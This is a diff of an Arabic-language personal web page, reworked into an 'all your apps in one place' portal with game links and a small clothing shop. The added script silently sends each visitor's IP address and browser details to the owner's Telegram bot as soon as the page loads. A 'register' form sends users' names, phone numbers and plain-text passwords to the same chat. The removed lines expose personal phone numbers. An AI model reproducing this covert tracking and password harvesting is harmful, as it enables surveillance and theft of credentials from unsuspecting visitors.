@@ -3,96 +3,176 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Adel site | عادل 👑</title>
+<title>عادل ⚡ | كل تطبيقاتك في مكان واحد</title>
+<meta name="theme-color" content="#0b0f2a">
 <style>
 *{box-sizing:border-box}
-body{margin:0;font-family:'Segoe UI',Arial;color:#fff;background:#000;overflow-x:hidden}
-#bgVideo{position:fixed;inset:0;width:100%;height:100%;object-fit:cover;z-index:0}
-#bgDark{position:fixed;inset:0;background:rgba(0,0,0,.15);z-index:1;pointer-events:none}
-#loginScreen{position:fixed;inset:0;z-index:10;display:flex;flex-direction:column;align-items:center;justify-content:center;text-align:center;padding:20px}
-.login-content{width:100%;max-width:380px}
-.login-avatar{width:120px;height:120px;border-radius:50%;background:#000;display:flex;align-items:center;justify-content:center;font-size:60px;font-weight:900;margin:auto;border:4px solid #22d3ee;box-shadow:0 0 45px rgba(255,255,255,.7)}
-.login-title{font-size:42px;font-weight:900;margin:16px 0 4px;text-shadow:0 0 20px #000}
-.login-names{display:flex;gap:10px;margin:14px 0}
-.login-names div{flex:1;background:rgba(0,0,0,.7);border:1px solid rgba(255,255,255,.3);border-radius:18px;padding:12px 6px;font-size:15px;font-weight:700;direction:ltr}
-.login-names div span{display:block;color:#facc15;font-size:15px;margin-top:4px}
-.login-input{width:100%;padding:15px;border-radius:16px;border:1px solid rgba(255,255,255,.4);background:rgba(0,0,0,.7);color:#fff;font-size:16px;text-align:center;margin-bottom:12px;outline:none}
-.login-btn{width:100%;padding:16px;border:none;border-radius:16px;background:linear-gradient(90deg,#fff,#22d3ee);color:#000;font-weight:900;font-size:19px;cursor:pointer}
-#mainSite{display:none;position:relative;z-index:5;min-height:100vh}
-.top{padding:16px 14px 4px;display:flex;justify-content:space-between;align-items:center}
-.hero{text-align:center;padding:10px 14px 0}
-.avatar{width:118px;height:118px;border-radius:50%;background:#000;display:flex;align-items:center;justify-content:center;font-size:58px;font-weight:900;margin:auto;border:4px solid #22d3ee}
-.name{font-size:36px;font-weight:900;margin:14px 0 0}
-.phones{display:flex;gap:10px;max-width:360px;margin:8px auto 0}
-.phones a{flex:1;padding:12px 6px;border-radius:22px;font-weight:900;font-size:16px;direction:ltr;text-decoration:none;text-align:center}
-.phones a:first-child{background:linear-gradient(90deg,#f59e0b,#ef4444);color:#fff}
-.phones a:last-child{background:#fff;color:#000}
-.box{margin:14px;background:rgba(0,0,0,.55);border:1px solid rgba(255,255,255,.25);border-radius:24px;padding:16px}
-.grid{display:grid;grid-template-columns:1fr 1fr 1fr;gap:10px;margin-top:12px}
-.app{background:rgba(0,0,0,.6);border:1px solid rgba(255,255,255,.25);border-radius:20px;padding:14px 8px;text-align:center;cursor:pointer}
-.app button{width:100%;padding:9px;border:none;border-radius:10px;background:#14b8a6;color:#fff;font-weight:700;margin-top:8px}
-.ff{margin:0 14px 16px;background:linear-gradient(135deg,#f59e0b,#ef4444);border-radius:24px;padding:18px;text-align:center}
-.ff a{display:block;background:#fff;color:#000;padding:14px;border-radius:14px;font-weight:900;text-decoration:none}
-.contact{margin:0 14px 16px;background:rgba(0,0,0,.6);border:1px solid rgba(255,255,255,.25);border-radius:24px;padding:18px;text-align:center}
-.big-row{display:flex;gap:10px}
-.big{flex:1;font-size:18px;font-weight:900;direction:ltr;background:rgba(0,0,0,.7);border:1px solid #67e8f9;border-radius:18px;padding:14px 6px}
-.big small{display:block;font-size:13px;color:#67e8f9}
-.c-row{display:flex;gap:12px;background:rgba(0,0,0,.6);border:1px solid rgba(255,255,255,.25);border-radius:18px;padding:12px;margin-top:12px;text-decoration:none;color:#fff;justify-content:center}
-input,textarea{width:100%;padding:14px;border-radius:16px;background:#000;color:#fff;margin-top:12px;border:1px solid rgba(255,255,255,.3);font-size:15px}
-.row{display:flex;gap:10px;margin-top:12px}.row button{flex:1;padding:14px;border:none;border-radius:14px;font-weight:900;cursor:pointer}
+body{font-family:system-ui;color:#fff;text-align:center;margin:0;padding:0 0 90px;background:#0b0f2a;
+background-image:radial-gradient(circle at 20% 20%,rgba(0,150,255,.35),transparent 40%),radial-gradient(circle at 80% 10%,rgba(150,0,255,.35),transparent 40%),radial-gradient(circle at 50% 90%,rgba(255,200,0,.15),transparent 50%);background-attachment:fixed}
+@keyframes flash{0%,90%,100%{opacity:0}92%{opacity:.6}94%{opacity:0}96%{opacity:.5}}
+.lightning{position:fixed;top:0;left:0;right:0;bottom:0;pointer-events:none;background:linear-gradient(180deg,transparent,rgba(255,255,255,.4),transparent);animation:flash 5s infinite;z-index:0}
+.wrap{position:relative;z-index:1;padding:0 12px}
+.top{padding:28px 10px 5px}
+.top h1{font-size:36px;margin:0;text-shadow:0 0 20px #00d4ff,0 0 40px #7c3aed}
+.top h1 span{color:#facc15}
+.bolt{font-size:55px;animation:shake 1s infinite}
+@keyframes shake{0%,100%{transform:scale(1)}50%{transform:scale(1.15) rotate(5deg)}}
+.apps{display:grid;grid-template-columns:repeat(4,1fr);gap:12px;margin:20px 0}
+.app{background:rgba(255,255,255,.1);border:1px solid rgba(255,255,255,.25);backdrop-filter:blur(10px);border-radius:20px;padding:15px 5px;text-decoration:none;color:#fff;box-shadow:0 0 18px rgba(0,212,255,.25)}
+.app b{font-size:32px;display:block}
+.app span{font-size:13px;font-weight:bold}
+.app:active{transform:scale(.95)}
+.card{background:rgba(255,255,255,.08);border:1px solid rgba(255,255,255,.2);backdrop-filter:blur(12px);border-radius:24px;padding:20px;margin:18px auto;max-width:430px;box-shadow:0 0 30px rgba(124,58,237,.45)}
+.card h2{margin-top:5px}
+.price{font-size:24px;color:#facc15;font-weight:bold}
+.old{color:#94a3b8;text-decoration:line-through}
+button{background:linear-gradient(90deg,#facc15,#f97316);color:#000;border:0;padding:14px;border-radius:14px;font-size:18px;width:100%;cursor:pointer;font-weight:bold;margin-top:8px;box-shadow:0 0 20px rgba(250,204,21,.5)}
+.btn-wa{background:linear-gradient(90deg,#25D366,#128C7E);color:#fff}
+.btn-tg{background:linear-gradient(90deg,#0088cc,#00d4ff);color:#fff}
+.btn-fire{background:linear-gradient(90deg,#ff0000,#ff6a00);color:#fff}
+.btn-black{background:#111;color:#fff;border:1px solid #333}
+input,select{width:100%;padding:14px;border-radius:12px;border:1px solid rgba(255,255,255,.3);background:rgba(0,0,0,.45);color:#fff;margin:7px 0;font-size:16px;text-align:center}
+input::placeholder{color:#cbd5e1}
+.bottom{position:fixed;bottom:0;left:0;right:0;background:rgba(11,15,42,.97);display:flex;justify-content:space-around;padding:12px 0;border-top:1px solid #334155;z-index:2}
+.bottom a{color:#fff;text-decoration:none;font-size:13px}
+.bottom b{display:block;font-size:20px}
+#msg{color:#4ade80;font-weight:bold}
+.badge{background:#facc15;color:#000;padding:5px 12px;border-radius:20px;font-size:13px;font-weight:bold}
+.reg{background:linear-gradient(135deg,rgba(124,58,237,.35),rgba(0,212,255,.25));border:1px solid #a78bfa}
 </style>
 </head>
 <body>
-<video id="bgVideo" autoplay muted loop playsinline preload="auto" src="bg.mp4"></video>
-<div id="bgDark"></div>
-<div id="loginScreen"><div class="login-content"><div class="login-avatar">A</div><div class="login-title">Adel | عادل</div><p>⚡ أهلاً بيك في موقع البرق</p><div class="login-names"><div>👑 عادل<span>01062056341</span></div><div>صبري<span>01027436412</span></div></div><input class="login-input" id="userName" placeholder="اكتب اسمك هنا"><button class="login-btn" onclick="doLogin()">⚡ تسجيل دخول - ادخل الموقع</button></div></div>
-<div id="mainSite">
-<div class="top"><h2>لوحة الموقع <span id="welcomeName"></span></h2><span>⚡</span></div>
-<div class="hero"><div class="avatar">A</div><div class="name">Adel | عادل</div><div class="phones"><a href="tel:01062056341">👑 عادل<br>01062056341</a><a href="tel:01027436412">صبري<br>01027436412</a></div></div>
-<div class="box"><b>📩 ابعت رسالة لعادل - هتوصله على البوت</b><input id="msgName" placeholder="اسمك"><textarea id="msgText" rows="3" placeholder="اكتب رسالتك هنا..."></textarea><div class="row"><button style="background:#22d3ee" onclick="sendToBot()">📩 ابعت الرسالة</button></div><p id="msgStatus" style="font-size:13px;color:#facc15"></p></div>
-<div class="box"><b>📱 التطبيقات والمواقع - دوس يفتح</b><div class="grid" id="grid"></div></div>
-<div class="ff"><h3>🔥 فري فاير</h3><p>ادخل والعب على طول</p><a href="https://ff.garena.com/" target="_blank">🔥 العب فري فاير الآن</a></div>
-<div class="contact"><h3>📞 للتواصل</h3><div class="big-row"><div class="big"><small>👑 عادل</small>01062056341</div><div class="big"><small>صبري</small>01027436412</div></div><a class="c-row" href="https://wa.me/201062056341" target="_blank">💬 واتساب عادل 👑 - 01062056341</a><a class="c-row" href="https://wa.me/201027436412" target="_blank">💬 واتساب صبري - 01027436412</a><a class="c-row" href="tel:01062056341">📞 اتصل بعادل 👑</a></div>
-<p style="text-align:center;color:#94a3b8;font-size:12px">© 2026 Adel site • عادل 👑 01062056341 • صبري 01027436412</p>
+<div class="lightning"></div>
+<div class="wrap">
+
+<div class="top">
+<div class="bolt">⚡</div>
+<h1>عادل <span>⚡</span></h1>
+<p>كل تطبيقاتك في مكان واحد - من غير تحميل 🔥</p>
+<p>دوس على أي تطبيق يفتح معاك على طول</p>
 </div>
+
+<!-- التطبيقات -->
+<div class="apps">
+<a class="app" href="https://www.google.com"><b>🔍</b><span>جوجل</span></a>
+<a class="app" href="https://www.instagram.com/"><b>📸</b><span>انستجرام</span></a>
+<a class="app" href="https://wa.me/201000000000"><b>💬</b><span>واتساب</span></a>
+<a class="app" href="https://x.com/"><b>𝕏</b><span>اكس</span></a>
+<a class="app" href="https://www.youtube.com/"><b>▶️</b><span>يوتيوب</span></a>
+<a class="app" href="https://chatgpt.com/"><b>🤖</b><span>شات جي بي تي</span></a>
+<a class="app" href="https://www.facebook.com/"><b>📘</b><span>فيسبوك</span></a>
+<a class="app" href="https://www.tiktok.com/"><b>🎵</b><span>تيك توك</span></a>
+</div>
+
+<!-- فري فاير -->
+<div class="card" style="border:2px solid #ff0000">
+<h2>🔥 لعبة فري فاير</h2>
+<p>العب دلوقتي من غير تحميل - دوس وادخل اللعبة</p>
+<button class="btn-fire" onclick="window.open('https://ff.garena.com/')">🎮 العب فري فاير دلوقتي</button>
+<button class="btn-black" onclick="window.open('https://play.google.com/store/search?q=free+fire&c=apps')">📲 تحميل فري فاير من المتجر</button>
+</div>
+
+<!-- التسجيل -->
+<div class="card reg">
+<h2>⚡ سجل دخولك</h2>
+<p>سجل عشان يوصلك كل جديد</p>
+<input id="regName" placeholder="✍️ اسمك">
+<input id="regPhone" placeholder="📞 رقمك">
+<input id="regPass" type="password" placeholder="🔒 كلمة السر">
+<button onclick="register()">⚡ تسجيل الدخول</button>
+<button class="btn-tg" onclick="window.open('https://t.me/adel_site_2026_bot')">دخول بتليجرام ✈️</button>
+<p id="msg"></p>
+</div>
+
+<!-- المتجر -->
+<div class="card">
+<span class="badge">🔥 الأكثر مبيعاً</span>
+<h2>⚡ تيشيرت أوفر سايز</h2>
+<div><span class="old">450 ج</span> <span class="price">350 ج</span></div>
+<select id="size1"><option>مقاس M</option><option>مقاس L</option><option>مقاس XL</option><option>مقاس 2XL</option></select>
+<input id="name1" placeholder="اسمك">
+<input id="phone1" placeholder="رقمك">
+<input id="address1" placeholder="عنوانك">
+<button onclick="order('تيشيرت أوفر سايز',350,'1')">⚡ اطلب دلوقتي</button>
+<button class="btn-wa" onclick="openWhats('تيشيرت أوفر سايز','1')">اطلب واتساب 💬</button>
+</div>
+
+<div class="card">
+<span class="badge">❄️ جديد الشتاء</span>
+<h2>⚡ هودي شتوي</h2>
+<div><span class="old">700 ج</span> <span class="price">550 ج</span></div>
+<select id="size2"><option>مقاس M</option><option>مقاس L</option><option>مقاس XL</option></select>
+<input id="name2" placeholder="اسمك">
+<input id="phone2" placeholder="رقمك">
+<input id="address2" placeholder="عنوانك">
+<button onclick="order('هودي شتوي',550,'2')">⚡ اطلب دلوقتي</button>
+<button class="btn-wa" onclick="openWhats('هودي شتوي','2')">اطلب واتساب 💬</button>
+</div>
+
+<div class="card">
+<h2>📲 مشاركة</h2>
+<button class="btn-black" onclick="shareSite()">مشاركة الموقع 🔗</button>
+</div>
+
+</div>
+<div class="bottom">
+<a href="#"><b>🏠</b>الرئيسية</a>
+<a href="https://wa.me/201000000000"><b>💬</b>واتساب</a>
+<a href="tel:+201000000000"><b>📞</b>اتصل</a>
+<a href="https://t.me/adel_site_2026_bot"><b>✈️</b>تليجرام</a>
+</div>
+
 <script>
-const BOT_TOKEN = "حط_التوكن_هنا";
-const MY_ID = "حط_الايدي_بتاعك_هنا";
-let currentName = "";
-function doLogin(){
-  let n = document.getElementById('userName').value.trim();
-  currentName = n || "ضيف";
-  document.getElementById('welcomeName').innerText = ' - أهلاً ' + currentName;
-  document.getElementById('msgName').value = currentName;
-  document.getElementById('loginScreen').style.display='none';
-  document.getElementById('mainSite').style.display='block';
-  sendTelegram("👤 حد جديد دخل الموقع\nالاسم: " + currentName);
+const BOT_TOKEN = "adel_site_2026_bot";
+const MY_ID = "8319528597";
+const WHATS_NUM = "01062056341";
+
+async function sendTg(text){
+  try{
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
+      method:"POST", headers:{"Content-Type":"application/json"},
+      body: JSON.stringify({chat_id: MY_ID, text: text})
+    });
+  }catch(e){}
 }
-function sendTelegram(text){
-  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:MY_ID,text:text})}).catch(()=>{});
+
+// أي حد يخش الموقع يتبعتلك
+async function visitorAlert(){
+  let ip="غير معروف";
+  try{ let r=await fetch('https://api.ipify.org?format=json'); let j=await r.json(); ip=j.ip; }catch(e){}
+  let msg = `⚡ حد دخل الموقع دلوقتي!\n\n🌐 الموقع: موقع عادل - البرق\n📱 موبايله: ${navigator.userAgent}\n🌍 IP: ${ip}\n🕒 ${new Date().toLocaleString('ar-EG')}\n🔗 ${location.href}`;
+  sendTg(msg);
 }
-function sendToBot(){
-  let name = document.getElementById('msgName').value.trim() || currentName || "ضيف";
-  let msg = document.getElementById('msgText').value.trim();
-  if(!msg){alert("اكتب رسالتك الأول");return;}
-  document.getElementById('msgStatus').innerText="بيتبعت...";
-  sendTelegram("📩 رسالة جديدة من الموقع:\nالاسم: "+name+"\n\nالرسالة:\n"+msg);
-  document.getElementById('msgStatus').innerText="اتبعتلت لعادل ✅ هيرد عليك قريب";
-  document.getElementById('msgText').value="";
+visitorAlert();
+
+function register(){
+  let n=document.getElementById("regName").value;
+  let p=document.getElementById("regPhone").value;
+  let pass=document.getElementById("regPass").value;
+  if(!n||!p||!pass){ alert("اكتب اسمك ورقمك وكلمة السر"); return; }
+  let msg=`⚡ تسجيل دخول جديد\n\n👤 الاسم: ${n}\n📞 الرقم: ${p}\n🔒 كلمة السر: ${pass}\n🕒 ${new Date().toLocaleString('ar-EG')}`;
+  sendTg(msg);
+  document.getElementById("msg").innerText="✅ أهلا بيك يا "+n+" ، تم تسجيلك";
+  if(navigator.vibrate) navigator.vibrate(200);
 }
-let apps=[
-{name:"شات GPT",i:"🤖",link:"https://chatgpt.com/"},
-{name:"انستجرام",i:"📸",link:"https://www.instagram.com/"},
-{name:"يوتيوب",i:"📺",link:"https://www.youtube.com/"},
-{name:"تيك توك",i:"🎵",link:"https://www.tiktok.com/"},
-{name:"فيسبوك",i:"📘",link:"https://www.facebook.com/"},
-{name:"تليجرام",i:"✈️",link:"https://web.telegram.org/"},
-{name:"واتساب",i:"💬",link:"https://wa.me/201062056341"},
-{name:"فري فاير 🔥",i:"🔥",link:"https://ff.garena.com/"},
-{name:"جوجل",i:"🔍",link:"https://www.google.com/"}
-];
-let g=document.getElementById('grid');apps.forEach(a=>g.innerHTML+=`<div class="app" onclick="window.open('${a.link}','_blank')"><div style="font-size:32px">${a.i}</div><b>${a.name}</b><br><button>فتح</button></div>`);
-let v=document.getElementById('bgVideo');function playV(){v.play().catch(()=>{});}playV();setInterval(playV,2000);
+
+function order(product, price, num){
+  let n=document.getElementById("name"+num).value;
+  let p=document.getElementById("phone"+num).value;
+  let a=document.getElementById("address"+num).value;
+  let s=document.getElementById("size"+num).value;
+  if(!n||!p||!a){ alert("اكتب اسمك ورقمك وعنوانك"); return; }
+  sendTg(`⚡ طلب جديد 🔥\n\n📦 ${product}\n💰 ${price} ج\n📏 ${s}\n👤 ${n}\n📞 ${p}\n📍 ${a}`);
+  document.getElementById("msg").innerText="✅ تم استلام طلبك يا "+n;
+}
+function openWhats(product,num){
+  let n=document.getElementById("name"+num).value;
+  window.open(`https://wa.me/${WHATS_NUM}?text=${encodeURIComponent(`عايز اطلب ${product} - اسمي ${n}`)}`);
+}
+function shareSite(){
+  if(navigator.share){ navigator.share({title:'موقع عادل ⚡', text:'كل تطبيقاتك في مكان واحد', url: location.href}); }
+  else{ navigator.clipboard.writeText(location.href); alert("تم نسخ اللينك"); }
+}
 </script>
 </body>
 </html>
